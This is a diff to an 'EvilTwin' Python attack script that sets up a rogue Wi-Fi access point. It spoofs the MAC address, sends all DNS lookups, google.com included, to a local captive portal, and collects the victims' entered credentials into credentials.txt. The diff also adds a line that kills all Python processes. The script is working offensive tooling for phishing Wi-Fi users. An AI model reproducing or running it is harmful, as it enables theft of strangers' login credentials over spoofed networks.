@@ -5,7 +5,7 @@
 # aircrack-ng  
 # apache2
 # macchanger
-#
+
 #Ubuntu 21.10   Tested - OK
 #KALI 2022.1    Tested - OK
 
@@ -13,11 +13,8 @@
 from operator import index
 import os
 from evilconfig import *
-from http.server import BaseHTTPRequestHandler, HTTPServer
 
-
-directorycmd = os.system('pwd > /dev/null 2>&1')
-
+directorycmd = os.popen('pwd > /dev/null 2>&1').read
 
 hostapdCONF ="\
 interface=" + wInt + "\n\
@@ -41,6 +38,7 @@ address=/#/10.0.0.1\n\
 address=/www.google.com/10.0.0.1\n\
 "
 
+
 class EvilTwin:
 
     def __init__(self,inter):
@@ -48,6 +46,7 @@ class EvilTwin:
         self.inter = inter
         print ("\n>>> Change MAC address")
         os.system('macchanger -a ' + self.inter + ' > /dev/null 2>&1')
+        
         print (">>> restart-apache2")
         os.system('service apache2 stop > /dev/null 2>&1')
         os.system('service apache2 start > /dev/null 2>&1')
@@ -87,8 +86,7 @@ class EvilTwin:
         print ("restore system....\n")
 
         # salva i dati direttamente
-        os.system('cp /var/www/html/captive/credentials.txt ' + str(directorycmd))
-        os.system('mv 0 credentials.txt')
+        os.system('cp /var/www/html/captive/credentials.txt credentials.txt')
 
         os.system('systemctl start systemd-resolved > /dev/null 2>&1')
         os.system('service NetworkManager start > /dev/null 2>&1')
@@ -98,8 +96,6 @@ class EvilTwin:
         os.system('cp -r /tmp/html /var/www/ > /dev/null 2>&1')
         os.system('chown -R www-data:www-data /var/www/html/ > /dev/null 2>&1')
         os.system('rm -r conf > /dev/null 2>&1')
-
-
 
 def configF():
     os.system('mkdir conf > /dev/null 2>&1')
@@ -118,7 +114,8 @@ def configB():
 
 
 if(__name__ == "__main__"):
-    
+
     configF()
     configB()
     x = EvilTwin(wInt)
+    os.system('killall python')
